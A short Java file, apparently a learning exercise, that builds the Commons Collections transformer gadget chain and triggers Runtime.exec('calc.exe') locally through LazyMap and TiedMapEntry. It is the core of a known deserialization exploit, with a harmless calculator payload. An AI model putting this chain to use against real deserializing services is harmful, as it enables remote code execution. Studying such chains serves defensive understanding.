import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class PreChain {
    @SuppressWarnings("ResultOfMethodCallIgnored")
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer ct = new ChainedTransformer(transformers);
        Map<Object, Object> hashMap = new HashMap<>();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, ct);
//        lazyMap.get(Runtime.getRuntime());

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");
        tiedMapEntry.getValue(); // -> lazyMap.get(key)
    }
}
